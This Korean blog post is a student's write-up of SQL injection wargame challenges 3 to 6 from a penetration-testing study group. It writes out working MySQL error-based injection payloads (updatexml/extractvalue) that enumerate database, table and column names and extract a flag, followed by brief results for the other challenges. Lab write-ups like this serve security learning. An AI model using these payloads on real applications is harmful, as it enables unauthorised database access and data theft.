---
layout: post
title:  노말틱 모의해킹 스터디 7주차 워게임 정리 
author: leewoojin
date: 2025-05-28 00:00:00 +0900
categories: [Pentest, W7]
tags: []
---

## SQL Injection 3
### 문제 
```
이 세상은 에러 천지야.. ㅠㅜ

flag를 찾아주세요.!

계정 : normaltic / 1234
```
<img width="365" alt="Image" src="https://github.com/user-attachments/assets/09a98ab5-9ff7-45df-8534-62f14434e7b1" />

### 1. DB 에러 메시지 유도
```
Could not update data: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''normaltic''' at line 1
```

### DB 이름 찾기 
```
' AND updatexml(1, concat(0x7e, (SELECT database())), 1)-- 
```
> Could not update data: XPATH syntax error: '~sqli_2'

### 테이블 이름 찾기 
```
' AND updatexml(1, concat(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1 OFFSET 0)), 1)-- 
```
> flag_table , member 총 2개 테이블 발견

### 컬럼명 찾기 
```
' AND extractvalue(1, concat(0x7e, (SELECT column_name FROM information_schema.columns WHERE table_schema='sqli_2' AND table_name='flag_table' LIMIT 0,1)))and'1'='1
```
> flag

### 데이터 찾기 
```
' AND extractvalue(1, concat(0x7e, (SELECT flag FROM flag_table LIMIT 0,1)))and'1'='1
```

## SQL Injection 4

### db
sqli_2_1

### table 
flag_table, 

### column
flag1~8

### data 
노가다로 하나씩 찾으면 성공 ~ (자동화 코드 쓸걸)

## SQL Injection 5
해당 문제는 해당 문제는 **에러 메시지를 출력하지 않고**, 참/거짓 여부만으로 판단할 수 있는 **Blind SQL Injection** 유형입니다.

<img width="370" alt="Image" src="https://github.com/user-attachments/assets/8b14e262-0ec0-4247-83a0-98817e09dc17" />

자동화 코드를 사용하여 

### database
sqli_2_2

### table 
flagTable_this

### column
idx, flag

### Data 
이 문제, 진짜 플래그 하나 찾으려면 가짜 플래그 13개 정도는 보고 가야 함

## SQL Injection 6

### database 
sqli_3

### table 
flag_table

### column
flag

### data 
전 문제는 가짜 플래그에 낚여서 고생했는데, 이번 문제는 깔끔하게 정답 플래그가 바로 나와서 Good 👍

